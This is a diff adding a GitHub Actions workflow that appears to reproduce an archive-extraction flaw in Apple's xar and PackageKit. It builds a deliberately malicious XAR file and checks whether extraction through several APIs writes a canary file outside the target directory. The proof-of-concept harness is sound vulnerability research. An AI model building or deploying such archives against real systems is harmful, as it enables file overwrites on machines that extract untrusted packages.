@@ -1,0 +1,306 @@
+name: gate_a_d_run28
+
+on:
+  workflow_dispatch:
+
+jobs:
+  gate_a_d:
+    runs-on: macos-15
+    permissions:
+      contents: write
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: macOS version + archive hash
+        run: |
+          sw_vers
+          echo "=== Archive SHA256 (built inline below) ==="
+
+      - name: Clone xar-501 at 7c1427d
+        run: |
+          git clone https://github.com/apple-oss-distributions/xar.git /tmp/xar_src
+          cd /tmp/xar_src && git checkout 7c1427d
+
+      - name: Build libxar at 7c1427d
+        continue-on-error: true
+        run: |
+          cd /tmp/xar_src/xar
+          ./configure --prefix=/tmp/xar_inst 2>&1 | tail -5
+          make -j4 2>&1 | tail -10
+          make install 2>&1 | tail -5
+          ls -la /tmp/xar_inst/lib/ || echo "(libxar build failed)"
+
+      - name: Build malicious XAR (run28 = same as r27)
+        run: |
+          mkdir -p /tmp/xar_build
+          cp build_xar_r27.c /tmp/xar_build/build_xar_r28.c
+          cd /tmp/xar_build
+          cc -O2 -o build_xar_r28 build_xar_r28.c -lz
+          ./build_xar_r28
+          mv malicious_ga.xar malicious_r28.xar
+          echo "=== Archive SHA256 ==="
+          shasum -a 256 malicious_r28.xar
+          ls -la malicious_r28.xar
+
+      - name: Gate D — canary state BEFORE (must be absent)
+        run: |
+          echo "=== PRE Gate D: canary state ==="
+          rm -f /tmp/xar_gated_canary_macos.txt
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && echo "CANARY EXISTS (unexpected)" || echo "CANARY ABSENT (expected)"
+
+      - name: Gate D — run PoC (libxar 7c1427d)
+        run: |
+          mkdir -p /tmp/gate_d_r28
+          cat > /tmp/gate_d_r28/poc_d.c << 'C_EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <dlfcn.h>
+          #include <unistd.h>
+          #include <sys/stat.h>
+          #include <limits.h>
+          typedef void* xar_t; typedef void* xar_file_t; typedef void* xar_iter_t;
+          int main(int argc, char *argv[]) {
+              void *h=dlopen("/tmp/xar_inst/lib/libxar.1.dylib",RTLD_LAZY);
+              if(!h){fprintf(stderr,"dlopen:%s\n",dlerror());return 1;}
+              typedef xar_t (*xar_open_fn)(const char*,int32_t);
+              typedef int   (*xar_extract_fn)(xar_t,xar_file_t);
+              typedef xar_iter_t (*xar_iter_new_fn)(void);
+              typedef xar_file_t (*xar_file_first_fn)(xar_t,xar_iter_t);
+              typedef xar_file_t (*xar_file_next_fn)(xar_iter_t);
+              typedef int   (*xar_close_fn)(xar_t);
+              typedef void  (*xar_iter_free_fn)(xar_iter_t);
+              xar_open_fn      fn_o =(xar_open_fn)      dlsym(h,"xar_open");
+              xar_extract_fn   fn_e =(xar_extract_fn)   dlsym(h,"xar_extract");
+              xar_iter_new_fn  fn_in=(xar_iter_new_fn)  dlsym(h,"xar_iter_new");
+              xar_file_first_fn fn_f=(xar_file_first_fn)dlsym(h,"xar_file_first");
+              xar_file_next_fn fn_n =(xar_file_next_fn) dlsym(h,"xar_file_next");
+              xar_close_fn     fn_c =(xar_close_fn)     dlsym(h,"xar_close");
+              xar_iter_free_fn fn_if=(xar_iter_free_fn) dlsym(h,"xar_iter_free");
+              char abs[4096];
+              realpath(argc>1?argv[1]:"malicious_r28.xar",abs);
+              printf("[D] archive: %s\n", abs);
+              mkdir("/tmp/gate_d_r28_work",0755); chdir("/tmp/gate_d_r28_work");
+              xar_t x=fn_o(abs,0);
+              if(!x){fprintf(stderr,"xar_open failed\n");return 1;}
+              xar_iter_t xi=fn_in();
+              for(xar_file_t f=fn_f(x,xi);f;f=fn_n(xi)){
+                  int rc=fn_e(x,f); printf("[D] xar_extract rc=%d\n",rc);
+              }
+              fn_if(xi); fn_c(x);
+              printf("[D] workdir listing:\n");
+              system("ls -laR /tmp/gate_d_r28_work/");
+              struct stat st;
+              if(stat("/tmp/xar_gated_canary_macos.txt",&st)==0){
+                  printf("[!] GATE D PASS: canary exists outside workdir\n"); return 0;
+              }
+              printf("[-] GATE D FAIL\n"); return 1;
+          }
+          C_EOF
+          cd /tmp/gate_d_r28
+          cc -O2 -o poc_d poc_d.c -Wl,-rpath,/tmp/xar_inst/lib
+          ./poc_d /tmp/xar_build/malicious_r28.xar
+          echo "=== POST Gate D: canary state ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && echo "GATE_D=PASS" || echo "GATE_D=FAIL"
+          echo "=== Canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      - name: Gate A — clear canary (CLEAN SLATE for Gate A)
+        run: |
+          echo "=== Removing canary before Gate A ==="
+          rm -f /tmp/xar_gated_canary_macos.txt
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && echo "CANARY STILL EXISTS (bad)" || echo "CANARY ABSENT — Gate A starting clean"
+
+      - name: Gate A — Method SYS-XAR — system xar CLI
+        continue-on-error: true
+        run: |
+          echo "=== system xar CLI ==="
+          which xar && xar --version 2>&1 || echo "(xar CLI not found)"
+          mkdir -p /tmp/gate_a_sysxar
+          cd /tmp/gate_a_sysxar
+          echo "PRE: canary absent = $(ls /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo yes)"
+          xar -xf /tmp/xar_build/malicious_r28.xar 2>&1 || echo "(xar extract done)"
+          echo "=== workdir listing after xar -xf ==="
+          ls -laR /tmp/gate_a_sysxar/
+          echo "=== canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_SYSXAR=PASS" || echo "GATE_A_SYSXAR=FAIL"
+          echo "=== canary content ==="
+          cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+
+      - name: Gate A — clear canary again before ObjC probe
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          echo "Canary cleared for ObjC probe"
+
+      - name: Gate A — Method PKXARArchive — ObjC API via PackageKit
+        continue-on-error: true
+        run: |
+          cat > /tmp/gate_a_objc.m << 'EOF'
+          #import <Foundation/Foundation.h>
+          #include <dlfcn.h>
+          #include <sys/stat.h>
+
+          #define PK "/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit"
+
+          int main(int argc, char *argv[]) {
+              if (argc < 2) { fprintf(stderr, "usage: gate_a_objc <xar>\n"); return 1; }
+              NSString *archivePath = [NSString stringWithUTF8String:argv[1]];
+
+              void *h = dlopen(PK, RTLD_LAZY | RTLD_GLOBAL);
+              if (!h) { fprintf(stderr, "dlopen: %s\n", dlerror()); return 1; }
+              fprintf(stdout, "[A-ObjC] PackageKit loaded\n");
+
+              /* Try to use PKXARArchive ObjC class */
+              Class PKXARArchive = NSClassFromString(@"PKXARArchive");
+              if (!PKXARArchive) {
+                  fprintf(stdout, "[A-ObjC] PKXARArchive class not found\n");
+                  return 1;
+              }
+              fprintf(stdout, "[A-ObjC] PKXARArchive class found\n");
+
+              /* Look for extraction selectors */
+              SEL selInit   = NSSelectorFromString(@"initWithPath:");
+              SEL selExtract = NSSelectorFromString(@"extractToPath:error:");
+              SEL selExtractPath = NSSelectorFromString(@"extractToPath:options:error:");
+
+              id archive = [[PKXARArchive alloc] performSelector:selInit
+                              withObject:archivePath];
+              if (!archive) {
+                  fprintf(stdout, "[A-ObjC] alloc/init failed\n");
+                  return 1;
+              }
+              fprintf(stdout, "[A-ObjC] PKXARArchive instance created\n");
+
+              NSString *destPath = @"/tmp/gate_a_objc_out";
+              [[NSFileManager defaultManager] createDirectoryAtPath:destPath
+                  withIntermediateDirectories:YES attributes:nil error:nil];
+
+              NSError *err = nil;
+              BOOL ok = NO;
+
+              if ([archive respondsToSelector:selExtract]) {
+                  fprintf(stdout, "[A-ObjC] calling extractToPath:error:\n");
+                  ok = (BOOL)((id(*)(id,SEL,id,id*))objc_msgSend)(archive, selExtract, destPath, &err);
+              } else if ([archive respondsToSelector:selExtractPath]) {
+                  fprintf(stdout, "[A-ObjC] calling extractToPath:options:error:\n");
+                  ok = (BOOL)((id(*)(id,SEL,id,id,id*))objc_msgSend)(archive, selExtractPath, destPath, nil, &err);
+              } else {
+                  fprintf(stdout, "[A-ObjC] no known extract selector found\n");
+                  /* Dump available methods */
+                  unsigned int count = 0;
+                  Method *methods = class_copyMethodList([archive class], &count);
+                  for (unsigned int i = 0; i < count && i < 30; i++) {
+                      fprintf(stdout, "[A-ObjC] method: %s\n",
+                              sel_getName(method_getName(methods[i])));
+                  }
+                  free(methods);
+                  return 1;
+              }
+
+              fprintf(stdout, "[A-ObjC] extract returned: %d err: %s\n",
+                      (int)ok, err ? [[err description] UTF8String] : "nil");
+              fprintf(stdout, "=== workdir listing ===\n");
+              system("ls -laR /tmp/gate_a_objc_out/ 2>/dev/null");
+
+              struct stat st;
+              if (stat("/tmp/xar_gated_canary_macos.txt", &st) == 0) {
+                  fprintf(stdout, "[!] GATE A PASS (PKXARArchive ObjC)\n");
+                  return 0;
+              }
+              fprintf(stdout, "[-] GATE A FAIL (PKXARArchive ObjC — canary absent)\n");
+              return 1;
+          }
+          EOF
+          cc -O2 -fobjc-arc -framework Foundation \
+            -o /tmp/gate_a_objc /tmp/gate_a_objc.m 2>&1 || echo "(compile error)"
+          if [ -x /tmp/gate_a_objc ]; then
+            /tmp/gate_a_objc /tmp/xar_build/malicious_r28.xar 2>&1
+          fi
+          echo "=== POST ObjC: canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_OBJC=PASS" || echo "GATE_A_OBJC=FAIL"
+
+      - name: Gate A — clear canary and recheck PackageKit C API (no path sanitization flag)
+        continue-on-error: true
+        run: |
+          rm -f /tmp/xar_gated_canary_macos.txt
+          mkdir -p /tmp/gate_a_pk_r28
+          # Gate A PoC (same as r21/r27) — documents Method A result
+          cp poc_gate_a_r21.c /tmp/gate_a_pk_r28/poc_gate_a_r28.c
+          cc -O2 -o /tmp/gate_a_pk_r28/poc_gate_a_r28 /tmp/gate_a_pk_r28/poc_gate_a_r28.c
+          cd /tmp/gate_a_pk_r28
+          ./poc_gate_a_r28 /tmp/xar_build/malicious_r28.xar 2>&1 | tee poc_r28_output.txt
+          echo "=== POST PKC API: canary check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A_PKC=PASS" || echo "GATE_A_PKC=FAIL"
+
+      - name: Enumerate xar in system libraries
+        run: |
+          echo "=== system xar CLI ==="
+          which xar 2>/dev/null && xar --version 2>&1 || echo "(no system xar)"
+          echo "=== find xar binary ==="
+          find /usr/bin /usr/local/bin -name "xar" 2>/dev/null
+          echo "=== otool -L on system xar ==="
+          otool -L /usr/bin/xar 2>/dev/null || echo "(no /usr/bin/xar)"
+          echo "=== macOS version ==="
+          sw_vers
+
+      - name: Collect and push results
+        if: always()
+        run: |
+          cd $GITHUB_WORKSPACE
+          {
+            echo "=== RUN 28 RESULTS ==="
+            echo "date: $(date -u)"
+            echo ""
+            echo "=== Archive SHA256 ==="
+            shasum -a 256 /tmp/xar_build/malicious_r28.xar 2>/dev/null || echo "(not found)"
+            echo ""
+            echo "=== macOS version ==="
+            sw_vers
+            echo ""
+            echo "=== GATE D ==="
+            echo "PRE: canary was removed before Gate D"
+            ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+              echo "GATE_D=PASS" || echo "GATE_D=(canary absent — check gate_d_r28_work)"
+            echo "=== Gate D workdir ==="
+            ls -laR /tmp/gate_d_r28_work/ 2>/dev/null | head -20
+            echo ""
+            echo "=== GATE A — System xar CLI ==="
+            echo "Note: canary was cleared before this step"
+            ls -laR /tmp/gate_a_sysxar/ 2>/dev/null | head -20
+            echo "CANARY after sysxar:"
+            cat /tmp/xar_gated_canary_macos.txt 2>/dev/null || echo "(absent)"
+            echo ""
+            echo "=== GATE A — PKXARArchive ObjC ==="
+            echo "Note: canary cleared before ObjC probe"
+            ls -laR /tmp/gate_a_objc_out/ 2>/dev/null | head -20
+            echo ""
+            echo "=== GATE A — PackageKit C API (r28) ==="
+            echo "Note: canary cleared before C API probe"
+            cat /tmp/gate_a_pk_r28/poc_r28_output.txt 2>/dev/null || echo "(not found)"
+            echo ""
+            echo "=== FINAL CANARY STATE ==="
+            ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+              echo "canary PRESENT" || echo "canary ABSENT"
+            cat /tmp/xar_gated_canary_macos.txt 2>/dev/null
+            echo ""
+            echo "=== System xar ==="
+            which xar 2>/dev/null && otool -L /usr/bin/xar 2>/dev/null || echo "(no system xar)"
+          } > run28_results.log
+          cat run28_results.log
+          git config user.email "ci@gate-a"
+          git config user.name "Gate A CI"
+          git add run28_results.log
+          git commit -m "Run 28 results — clean Gate A test [ci skip]" || echo "(nothing to commit)"
+          git push https://YuvalFradkin1:REDACTED_PAT@github.com/YuvalFradkin1/xar-symlink2-repro.git HEAD:main
+
+      - name: Upload Run 28 artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gate-a-d-run28-evidence
+          path: run28_results.log
+          retention-days: 30
